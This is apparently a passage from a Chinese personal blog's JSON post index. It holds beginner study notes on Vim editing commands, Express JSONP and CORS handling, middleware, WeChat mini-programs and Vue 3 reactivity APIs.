在标准命令行模式下，光标定位到当前行，按英文冒号「 ：」，再输入s/oldstring/newstring/g 回车，即可。 完整语句为： :s/dogg/dog/g 特定几行替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入#,#s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： ***:*5,8s/dogg/dog/g 全文替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/g 全文替换命令（每个匹配项替换前需确认） 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/gc 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/gc 作者：饥人谷_李维超链接：https://www.jianshu.com/p/8b679b35c9d5来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。Vim可以分为三种模式，分别为： 命令行模式（Command mode） 插入模式（Insert mode） 底行模式（Lastline mode） 命令行模式 控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。 插入模式 只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。 底行模式 将文件保存或退出vim，也可以设置编辑环境，如寻找字符串、列出行号……等。 不过，一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。 5. Vim的基本操作a) 进入Vim 在系统光标提示符后，输入vim及文件名后，回车，进入Vim编辑画面。 特别注意，进入vim之后，是处于「命令行模式（command mode）」，要切换到「插入模式（Insert mode）」才能够输入文字。 b) 切换至插入模式（Insert mode）编辑文件 在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。 c) 插入模式（Insert mode）切换到命令行模式（Command mode） 在插入模式下，按一下「ESC」键即可。 d) 退出vim及保存文件 在命令行模式（Command mode）下，按冒号「:」键，进入底行模式（Last Line mode） 常见底行模式下的命令行： :w filename 文件以filename为文件名保存 :wq 文件存盘并退出vim :q 文件不存盘并退出vim :q! 文件不存盘强制退出vim 6. 命令行模式下的功能键（部分）a) 从命令行模式切换为插入模式的三种方式 「 i 」：从当前光标位置进入插入模式 「 a 」：从当前光标位置的下一个字符进入插入模式 「 o 」：从当前光标位置的下一行进入插入模式 b) 从插入模式切换为命令行模式 按「ESC」键 c) 移动光标 vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。 d) 行尾追加 不管光标在该行的什么位置，直接按大写字母「A」即可 e) 删除单词 dw：把光标停留在需要删除的单词前面，依次按下「d」「w」，即可 de：把光标停留在需要删除的单词前面（无视单词前面的空格），依次按下「d」「e」，即可 f) 从当前光标处删除到行末 把光标停留在需要删除的句子前面，依次按下「d」「$」，即可 g) 快速跳转到行首 按下数字「0」，即可 h) 使用计数以删除单词 示例：this ABC DE line FGHI JK LMN OP of words is Q RS TUV cleaned up. 依次将鼠标定位到ABC前，按「d」「2」「w」，可以删除：ABC DE 将鼠标定位到FGHI前，按「d」「4」「w」，可以删除：FGHI JK LMN OP 将鼠标定位到Q前，按「d」「3」「w」，可以删除：Q RS TUV 得到句子： this line of words is cleaned up. i) 删除当前行 鉴于删除当前行这一操作的高频性，vim设计者简化了快捷键，按「d」「d」即可。 连续删除两行，从当前行开始，则为：「2」「d」「d」 j) 撤销更改 a. 按小写字母「u」，撤销上一步的更改操作； b. 按大写字母「U」，撤销整行的更改操作； c. 「Ctrl+R」撤销上一步「撤销操作」。 k) 将刚删除的内容置入其他行 之前刚刚删除的内容，会放入Vim编辑器的寄存器中。基于如此原理，可以将之认为成Windows操作系统的「剪切」操作。 先在想删除的行，按「d」「d」，进行删除操作； 再在想插入那行的前一行按「p」键即可。 l) 替换 将光标放到需要改的字符前，先按「r」键，再输入想更改的字符即可。 m) 跳转 顶部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入「g」「g」即可； 底部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入大写字母「g」即可； 特定行跳转命令：直接输入行号，然后输入大写字母「g」即可。 n) 查找命令 字符串查找： 输入英文斜杠「/」，后面紧接需要搜索的字符串即可。 查找下一个相同字符串，就紧接着按小写字母「n」； 查找上一个相同字符串，就紧接着按大写字母「N」。 配对括号查找： 在编程语言里，配对括号「 ( 」「 ) 」「 { 」「 } 」很常见，当定位到一个配对括号的一半时（注意光标要定位在该括号之前），按「%」，即可自动跳转到与之匹配的第一个配对括号处。 o) 替换字符串 当前行替换命令 在标准命令行模式下，光标定位到当前行，按英文冒号「 ：」，再输入s/oldstring/newstring/g 回车，即可。 完整语句为： :s/dogg/dog/g 特定几行替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入#,#s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： ***:*5,8s/dogg/dog/g 全文替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/g 全文替换命令（每个匹配项替换前需确认） 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/gc 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/gc","categories":[{"name":"vim","slug":"vim","permalink":"https://coloey.github.io/categories/vim/"}],"tags":[]},{"title":"JSONP解决跨域问题","slug":"JSONP解决跨域问题","date":"2022-03-14T09:46:33.000Z","updated":"2022-03-14T09:54:26.273Z","comments":true,"path":"2022/03/14/JSONP解决跨域问题/","link":"","permalink":"https://coloey.github.io/2022/03/14/JSONP%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/","excerpt":"","text":"概念： 浏览器通过标签的src属性，请求服务器上的数据，同时服务器返回一个函数的调用，这种请求数据的方式·叫做JSONP 如果项目中已经配置了CORS跨域资源共享，为防止冲突,必须在配置CORS中间件之前声明JSONP的接口，否则JSONP接口会被处理成开启了CORS的接口 123456789101112131415161718192021222324252627const express=require(&#x27;express&#x27;)//创建web服务器const app=express()//导入路由模块const apirouter=require(&#x27;./apirouter&#x27;)//在配置cors中间件之前定义JSONP的接口app.get(&#x27;/api/jsonp&#x27;,(req,res)=&gt;&#123; //1 得到客户端请求的回调函数名称 const funcName=req.query.callback //2 定义发送到客户端的JSON格式数据对象 const data=&#123;name:&#x27;zs&#x27;,age:20&#125; //3 拼接一个函数调用的字符串 const scriptStr=`$&#123;funcName&#125;($&#123;JSON.stringify(data)&#125;)` //4 把拼接的字符串响应给客户端的&lt;script&gt;标签进行解析执行 res.send(scriptStr)&#125;)app.use(express.urlencoded(&#123;extended:false&#125;))//在路由之前配置cors中间件const cors=require(&#x27;cors&#x27;)app.use(cors())//将路由模块注册为全局中间件app.use(&#x27;/api&#x27;,apirouter)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;) 发请求：HTML 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery/1.10.0/jquery.min.js&quot;&gt; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;btnJsonp&quot;&gt;Jsonp&lt;/button&gt; &lt;script&gt; $(&#x27;#btnJsonp&#x27;).on(&#x27;click&#x27;,function()&#123; $.ajax(&#123; type:&#x27;GET&#x27;, url:&#x27;http://127.0.0.1/api/jsonp&#x27;, dataType:&#x27;jsonp&#x27;, success:function(res)&#123; console.log(res) &#125; &#125;) &#125;) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"基于cors解决跨域问题","slug":"基于cors解决跨域问题","date":"2022-03-14T06:29:06.000Z","updated":"2022-03-14T09:13:22.067Z","comments":true,"path":"2022/03/14/基于cors解决跨域问题/","link":"","permalink":"https://coloey.github.io/2022/03/14/%E5%9F%BA%E4%BA%8Ecors%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/","excerpt":"","text":"123456789101112131415161718192021222324252627282930apirouter.js:const express=require(&#x27;express&#x27;)//创建web服务器实例const router=express.Router()//挂载对应路由router.get(&#x27;/get&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0,//0表示成功，1表示失败 msg:&#x27;Get请求成功&#x27;, data:req.query &#125;)&#125;)//定义post接口router.post(&#x27;/post&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0,//0表示成功，1表示失败 msg:&#x27;Post请求成功&#x27;, data:req.body &#125;)&#125;)//定义delete接口router.delete(&#x27;/delete&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0,//0表示成功，1表示失败 msg:&#x27;Delete请求成功&#x27;, &#125;)&#125;)module.exports=router Get ,Post,Delete接口 123456789101112131415const express=require(&#x27;express&#x27;)//创建web服务器const app=express()//导入路由模块const apirouter=require(&#x27;./apirouter&#x27;)app.use(express.urlencoded(&#123;extended:false&#125;))//在路由之前配置cors中间件,解决跨域问题const cors=require(&#x27;cors&#x27;)app.use(cors())//将路由模块注册为全局中间件app.use(&#x27;/api&#x27;,apirouter)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;) 解决接口跨域问题CORS(主流方案) JSONP（有缺陷：只支持Get请求） 什么是CORSCORS(Cross-Origin Resource Sharing,跨域资源共享)，由一系列Http响应头组成，这些Http响应头决定浏览器是否阻止前端JS代码跨域获取资源。 浏览器的同源安全策略默认会阻止网页“跨域”获取资源，但如果接口服务器配置了CORS相关的HTTP响应头，就可以解决浏览器端的跨域访问限制。 浏览器：网页==》跨域请求 接口服务器（配置Access-Control-Allow-*相关响应头） ​ 《== 响应 CORS响应头部Access-Control-Allow-Origin响应头部可以携带一个Access-Control-Allow-Origin字段，语法如下： Access-Control-Allow-Origin:|* 其中origin参数指定了允许访问该资源的外域URL 例如：下面字段只允许访问来自http://itcast.cn的请求 res.setHeader(‘Access-Control-Allow-Origin’,’http://itcast.cn&#39;) *通配符表示允许来自任何域的请求 Access-Control-Allow-Headers默认情况下，CORS仅支持客户端向服务器发送9个请求头： Accept,Accept-Language,Content-Language,DPR,Downlink,Save-Data,Viewport-Width,Width,Content-Type(仅限于text-plain,multipart/form-data,application/x-www-form-urlencoded三者之一) 如果向服务器发送了额外的请求头信息，则需要在服务器端，通过Access-Control-Allow-Headers对额外的请求头进行声明，否则这次请求会失败 例如，允许客户端向服务器发送Content-Type请求头和X-Custom-Header请求头 res.setHeader(‘Access-Control-Allow-Header’,’Content-Type’,’X-Custom-Header’) Access-Control-Allow-Methods 默认情况下，CORS仅支持客户端发起GET,POST,HEAD请求。如果客户端希望通过PUT,DELETE等方式请求服务器的资源，则需要在服务器端，通过Access-Control-Allow-Methods来指明实际请求所允许的HTTP方法 123res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;,&#x27;POST,GET,DELETE,HEAD&#x27;)//允许所有HTTP请求方法res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;,&#x27;*&#x27;) 请求类型简单请求满足两个条件即为简单请求： 1 请求方式为GET,POST,HEAD三者之一 2 HTTP头部信息不超过以下几种字段：无定义头部字段，Accept,Accept-Language,Content-Language,Save-Data,Viewport-Width,Width,Content-Type(仅限于text-plain,multipart/form-data,application/x-www-form-urlencoded三者之一) 特点：客户端与服务器只发生一次请求 预检请求1 请求方式为GET,POST,HEAD之外的请求方法 2 请求头中包含自定义头部字段 3 向服务器发送了application/jso格式的数据 在浏览器服务器的正式通信之前，浏览器会先发送OPTION请求进行预检，以获知该服务器是否允许该实际请求，这一次OPTION称为预检请求，服务器成功响应预检请求后才会发送真正的请求并且携带真正的数据。 特点：客户端与服务器只发生两次请求 CORS注意事项1 CORS主要在服务器端进行配置，客户端浏览器无需做任何额外的配置，即可请求开启CORS的接口 2 CORS在浏览器中有兼容性，只有支持XMLHttpRequest Level2的浏览器才能正常访问开启了CORS的服务端接口（IE10+,Chrome4+等）","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"自定义表单中间件","slug":"自定义表单中间件","date":"2022-03-13T15:13:46.000Z","updated":"2022-03-13T15:32:36.539Z","comments":true,"path":"2022/03/13/自定义表单中间件/","link":"","permalink":"https://coloey.github.io/2022/03/13/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%95%E4%B8%AD%E9%97%B4%E4%BB%B6/","excerpt":"","text":"12345678910111213const express=require(&#x27;express&#x27;)//创建web服务器实例const app=express()//导入处理查询字符串的querystring,通过这个模块提供的parse()函数，可以查询字符串，解析成对象的格式//const qs=require(&#x27;querystring&#x27;)const customBodyParser=require(&#x27;./custom-body-parser&#x27;)app.use(customBodyParser)app.post(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(req.body)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;express server running at http://127.0.0.1&#x27;)&#125;) customBodyParser.js 1234567891011121314151617const qs=require(&#x27;querystring&#x27;)const bodyParser=(req,res,next)=&gt;&#123; //1 定义一个str字符串，专门用来存储客户端发送过来的请求体数据 let str=&quot;&quot; //监听req的data事件 req.on(&#x27;data&#x27;,(chunk)=&gt;&#123; str+=chunk &#125;) //监听req的end事件 req.on(&#x27;end&#x27;,()=&gt;&#123; //在str存放的是完整的请求体数据，解析成对象格式 调用qs.parse()方法，把查询字符串解析为对象 const body=qs.parse(str) req.body=body//将解析处的请求体数据挂载为req.body next() &#125;)&#125;module.exports=bodyParser","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"路由","slug":"路由","date":"2022-03-12T15:34:29.000Z","updated":"2022-03-12T15:34:30.216Z","comments":true,"path":"2022/03/12/路由/","link":"","permalink":"https://coloey.github.io/2022/03/12/%E8%B7%AF%E7%94%B1/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"中间件","slug":"中间件","date":"2022-03-12T07:57:20.000Z","updated":"2022-03-13T15:29:55.148Z","comments":true,"path":"2022/03/12/中间件/","link":"","permalink":"https://coloey.github.io/2022/03/12/%E4%B8%AD%E9%97%B4%E4%BB%B6/","excerpt":"","text":"使用express创建服务器，发起Get,Post请求123456789101112131415161718192021222324252627const express=require(&#x27;express&#x27;)//创建web服务器实例const app=express()//监听客户端的get请求post请求,并向客户端响应请求app.get(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(&#123;name:&#x27;zs&#x27;,age:20,gender:&#x27;男&#x27;&#125;)&#125;)app.post(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(&#x27;请求成功&#x27;)&#125;)//获取请求参数app.get(&quot;/&quot;,(req,res)=&gt;&#123; //req.query可以获取到客户端发送过来的查询参数向客户端响应一个查询参数 console.log(req.query) res.send(req.query)&#125;)//获取到URL中的动态参数app.get(&quot;/user/:id/:username&quot;,(req,res)=&gt;&#123; console.log(req.params) res.send(req.params)&#125;)//启动服务器app.listen(80,()=&gt;&#123; console.log(&#x27;express server running at http://127.0.0.1&#x27;)&#125;) 托管静态资源express.static()：创建一个静态资源服务器，通过如下代码可以将public目录下的图片，CSS文件，JavaScript文件对外开放访问 123456789101112const express=require(&#x27;express&#x27;)//创建web服务器实例const app=express()//托管多个静态资源目录,express.static会根据目录的添加顺序查找所需文件，http://127.0.0.1,public不出现在路径中app.use(express.static(&#x27;public&#x27;))app.use(express.static(&#x27;files&#x27;))//希望挂载前缀ap.use(&#x27;/public&#x27;,express.static(&#x27;public&#x27;,))//打开的是http://127.0.0.1/public，如果希望public出现在路径中则将访问前缀写public//启动服务器app.listen(80,()=&gt;&#123; console.log(&#x27;express server running at http://127.0.0.1&#x27;)&#125;) 中间件中间件的作用：多个中间件之间共享一份req和res,基于这种特性可以在上游的中间件中，统一为req或res对象添加自定义顶点属性或方法，供下游的中间件或路由进行使用 1234567891011121314151617const express=require(&quot;express&quot;)const app=express()//中间件的作用：共享req,resapp.use((req,res,next)=&gt;&#123; const time=Date.now() req.startTime=time next()&#125;)app.get(&#x27;/&#x27;,(req,res)=&gt;&#123; res.send(&#x27;Home page&#x27;+req.startTime)&#125;)app.get(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(&#x27;User page&#x27;+req.startTime)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;http://127.0.0.1&#x27;)&#125;) 中间件分类：[]: http://expressjs.com/en/guide/using-middleware.html 错误级别的中间件要注册在所有路由之后 1234567891011121314const express = require(&quot;express&quot;);const app=express()app.get(&#x27;/&#x27;,(req,res)=&gt;&#123; throw new Error(&#x27;服务器发生错误&#x27;) res.send(&#x27;Home page&#x27;)&#125;)//错误级别中间件必须注册在所有路由之后app.use((err,req,res,next)=&gt;&#123; console.error(err.message) res.send(&#x27;Something broke:&#x27;+err.message)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;http://127.0.0.1&#x27;)&#125;) 使用中间件的注意事项 要在路由之前注册中间件 客户端发送过来的请求，可以连续调用多个中间件进行处理 执行完中间件的业务代码，要记得调用next（）函数 连续调用的多个中间件时，多个中间件间共享req和res对象","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"Web和微信小程序中本地存储的差别","slug":"Web和微信小程序中本地存储的差别","date":"2022-03-01T09:23:54.000Z","updated":"2022-03-01T09:32:35.988Z","comments":true,"path":"2022/03/01/Web和微信小程序中本地存储的差别/","link":"","permalink":"https://coloey.github.io/2022/03/01/Web%E5%92%8C%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B8%AD%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E7%9A%84%E5%B7%AE%E5%88%AB/","excerpt":"","text":"Web和微信小程序中本地存储的差别使用上Web:localStorage.setItem(“key”,”value”) ​ localStorage.getItem(“key”) 小程序中：wx.setStorageSync(“key”,”value”); ​ wx.getStorageSync(“key”) 数据存储Web:不管存入的是什么类型的数据，最终都会先调用toString()，把数据编程字符串再存进去 小程序：不存在类型转换，存什么类型的数据进去，获取的就是什么类型的数据","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"swiper","slug":"swiper","date":"2022-02-28T03:27:42.000Z","updated":"2022-02-28T03:31:48.073Z","comments":true,"path":"2022/02/28/swiper/","link":"","permalink":"https://coloey.github.io/2022/02/28/swiper/","excerpt":"","text":"swiper存在默认宽度和高度：100%*150px image存在默认宽度和高度：320px*240px 设计图片和轮播图： 1 先看原图的宽高：750*340 2 让图片的高度自适应 宽度等于100% 3 让swiper标签的高度变成和图片的一样高即可 4 图片标签mode=“widthFix”","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"组件通信","slug":"组件通信","date":"2022-02-26T15:39:09.000Z","updated":"2022-02-26T15:40:12.435Z","comments":true,"path":"2022/02/26/组件通信/","link":"","permalink":"https://coloey.github.io/2022/02/26/%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/","excerpt":"","text":"父组件向子组件传递数据1 父组件中： 123&lt;view&gt; &lt;Tab tabs=&quot;&#123;&#123;tabs&#125;&#125;&quot; binditemChange=&quot;handleItemChange&quot;&gt;&lt;/Tab&gt;&lt;/view&gt; 2.子组件： 1234567properties: &#123; tabs:&#123; type:Array, value:[] &#125; &#125;, 子组件向父组件传递数据：1 子组件：用this.triggerEvent(“事件名”,传递的参数) 123456789methods:&#123; handle(e)&#123; const &#123;index&#125;=e.currentTarget.dataset; this.triggerEvent(&quot;itemChange&quot;,&#123;index&#125;); &#125; &#125; 2 父组件：用”bind+事件名”触发自定义方法 123&lt;view&gt; &lt;Tab tabs=&quot;&#123;&#123;tabs&#125;&#125;&quot; binditemChange=&quot;handleItemChange&quot;&gt;&lt;/Tab&gt;&lt;/view&gt; 12345678910handleItemChange(e)&#123; //console.log(e) const &#123;index&#125;=e.detail; let &#123;tabs&#125;=this.data; tabs.forEach((v,i)=&gt;i===index?v.isActive=true:v.isActive=false); this.setData(&#123; tabs &#125;) &#125;","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"事件绑定","slug":"事件绑定","date":"2022-02-25T09:06:50.000Z","updated":"2022-02-26T15:40:06.139Z","comments":true,"path":"2022/02/25/事件绑定/","link":"","permalink":"https://coloey.github.io/2022/02/25/%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A/","excerpt":"","text":"绑定输入事件 用bindinput 获取输入框的值用e.detail.value 输入框赋值用this.setData({num:e.detail.num}) 点击事件 关键字:bindtap 无法在小程序中的事件直接传参，通过自定义事件传参 事件源中获取自定义属性","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"路由参数","slug":"路由参数","date":"2022-02-06T08:51:25.000Z","updated":"2022-02-06T15:07:41.991Z","comments":true,"path":"2022/02/06/路由参数/","link":"","permalink":"https://coloey.github.io/2022/02/06/%E8%B7%AF%E7%94%B1%E5%8F%82%E6%95%B0/","excerpt":"","text":"query参数：12345678&lt;li v-for=&#x27;m in messageList&#x27; :key=&#x27;m.id&#x27;&gt; &lt;!-- 通过query传递参数 --&gt; &lt;router-link :to=&quot; &#123; name:&#x27;messageDetail&#x27;, query:&#123;id:m.id,title:m.title&#125; &#125;&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;&lt;/li&gt; params参数:1 配置路由声明接收param参数 1234567891011&#123;path:&#x27;/home&#x27;, component:Home, children:[ &#123;path:&#x27;news&#x27;, component:News&#125;, &#123;path:&#x27;message&#x27;, component:Message, children:[ &#123;path:&#x27;detail/:id/:title&#x27;,name:&#x27;messageDetail&#x27;,component:Detail&#125;//使用占位符声明接收params参数 ]&#125; ]&#125;, 2 传递参数 12345678910 &lt;li v-for=&#x27;m in messageList&#x27; :key=&#x27;m.id&#x27;&gt; &lt;!--跳转并携带params参数，to的字符写法--!&gt; &lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt; &lt;!-- 对象写法只能写name不能写path --&gt; &lt;!-- &lt;router-link :to=&quot; &#123;name:&#x27;messageDetail&#x27;, params:&#123;id:m.id,title:m.title&#125; &#125;&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt; --&gt;&lt;/li&gt; 注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置项 props配置123456789101112//props第一种写法，值为对象，该对象中的key-value都会以props的形式传给Detail组件props:&#123;a:1,b:&#x27;hello&#x27;&#125;,//props的第二种写法，值为布尔值，若布尔值为真，就会把该路由组件收到的所有params参数以props的形式传给Detail组件props:true,//第三种写法，值为函数props($route)&#123; return &#123;id:$route.query.id,title:$route.query.title&#125;&#125;,//解构赋值props(&#123;query&#125;)&#123; return &#123;id:query.id,title:query.title&#125;&#125; Detail组件接收参数： 123456&lt;script&gt;export default &#123; name:&#x27;Detail&#x27;, props:[&#x27;id&#x27;,&#x27;title&#x27;],&#125;&lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"Vue3事件总线","slug":"Vue3事件总线","date":"2022-02-02T08:17:38.000Z","updated":"2022-02-02T08:38:36.586Z","comments":true,"path":"2022/02/02/Vue3事件总线/","link":"","permalink":"https://coloey.github.io/2022/02/02/Vue3%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF/","excerpt":"","text":"全局事件总线一种组件间的通信方式，适用于任意组件间的通信。 安装全局事件总线： 引入/编写事件库 在入口文件中挂载 在组件中引入并使用 安装：npm install –save vue3-eventbus 挂载： 123//App.vueimport eventBus from &#x27;vue3-eventbus&#x27;app.use(eventBus) 使用： 12345678//Button.vueimport bus from &#x27;vue3-eventbus&#x27;export default &#123; setup()&#123; bus.emit(&#x27;foo&#x27;,&#123;a:&#x27;b&#x27;&#125;) &#125;&#125; 消息订阅预发布（pubsub) 安装pubsub:npm install pubsub-js 引入：import pubsub from “pubsub-js” 接收数据，A组件想接收数据，则在A组件中订阅消息，订阅回调留在A组件自身。 12345678910methods()&#123; demo(data)&#123; &#125;&#125;mounted()&#123;this.pid=pubsub.subscribe(&#x27;xxx&#x27;,(msg,data)=&gt;&#123;&#125;)//订阅消息&#125; 提供数据：pubsub.publish(‘xxx’,数据) 最好在beforeDestroy钩子中，用Pubsub.unsubscribe(pid)取消订阅","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"customRef","slug":"customRef","date":"2022-02-01T08:55:59.000Z","updated":"2022-02-01T09:03:45.036Z","comments":true,"path":"2022/02/01/customRef/","link":"","permalink":"https://coloey.github.io/2022/02/01/customRef/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031setup()&#123; function myRef(value,delay=500)&#123; let timeout return customRef((track,trigger)=&gt;&#123; return &#123; get()&#123; console.log(`有人从myRef中读取了数据:$&#123;value&#125;`) track()//通知Vue追踪value的变化（提前和get商量一下，让它认为这个value是可用的） return value &#125;, set(newValue)&#123; clearTimeout(timeout) console.log(`有人从myRef中修改了数据:$&#123;newValue&#125;`) timeout=setTimeout(()=&gt;&#123; value=newValue trigger()//通知Vue重新解析模板 &#125;,delay) &#125; &#125; &#125;) &#125; let val=myRef(&quot;hello&quot;) return &#123; val &#125; &#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"shallowReactive和shallowRef","slug":"shallowReactive和shallowRef","date":"2022-01-31T08:41:52.000Z","updated":"2022-02-01T07:57:53.734Z","comments":true,"path":"2022/01/31/shallowReactive和shallowRef/","link":"","permalink":"https://coloey.github.io/2022/01/31/shallowReactive%E5%92%8CshallowRef/","excerpt":"","text":"shallowReactive:只处理对象最外层属性的响应式（浅响应式） shallowRef:只处理基本数据类型的响应式，不进行对象的响应式处理 什么时候使用？ 如果有一个对象数据，结构比较深，但变化时只是外层属性变化==&gt;shallowReactive 如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换==&gt;shallowRef","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"toRef","slug":"toRef","date":"2022-01-31T07:49:20.000Z","updated":"2022-02-01T07:57:57.787Z","comments":true,"path":"2022/01/31/toRef/","link":"","permalink":"https://coloey.github.io/2022/01/31/toRef/","excerpt":"","text":"toRef:作用：创建一个ref对象，其value值指向另一个对象中的某个属性 语法：const name=toRef(person,’name’) 应用：要将响应式对象中的某个属性单独提供给外部使用时 扩展:toRefs与toRef功能一致，但可以批量创建多个ref对象，语法：toRefs(person),将响应式对象转换为普通对象，其中结果对象的每个 property 都是指向原始对象相应 property 的 ref。 1234567891011121314151617181920212223242526272829303132333435363738394041 setup()&#123; let person=reactive(&#123; firstName:&quot;张&quot;, lastName:&quot;三&quot;, fullName:&#x27;&#x27;, job:&#123; one:&#x27;doctor&#x27;, tow:&#x27;teacher&#x27; &#125; &#125;) person.fullName=computed(&#123; get()&#123; return person.firstName+&#x27;-&#x27;+person.lastName &#125;, set(value)&#123; const nameArr=value.split(&#x27;-&#x27;) person.firstName=nameArr[0] person.lastName=nameArr[1] &#125; &#125;) return &#123; person, firstName:toRef(person,&#x27;firstName&#x27;), lastName:toRef(person,&#x27;lastName&#x27;), one:toRef(person.job,&#x27;one&#x27;), fullName:toRef(person,&#x27;fullName&#x27;) &#125;//toRefs:/*return &#123; person, ...toRefs(person), &#125;*/ &#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"watchEffect","slug":"watchEffect","date":"2022-01-30T15:44:30.000Z","updated":"2022-01-30T15:51:06.817Z","comments":true,"path":"2022/01/30/watchEffect/","link":"","permalink":"https://coloey.github.io/2022/01/30/watchEffect/","excerpt":"","text":"watch和watchEffect区别：watch:既要指明监视的属性，也要指明监视的回调 watchEffect:不用指明监视哪个属性，监视的回调中用到哪个属性就监视哪个属性 watchEffect有点像computed: 但computed注重的是计算出来的值即回调函数的返回值，所以必须要写返回值 而watch注重的是过程即回调函数的函数体，所以不用写返回值 123456789//watchEffect指定的回调函数中用到的数据只要发生变化，则直接重新执行回调 let sum=ref(1) let msg=ref(&quot;你好呀&quot;) watchEffect(()=&gt;&#123; const x1=sum.value const 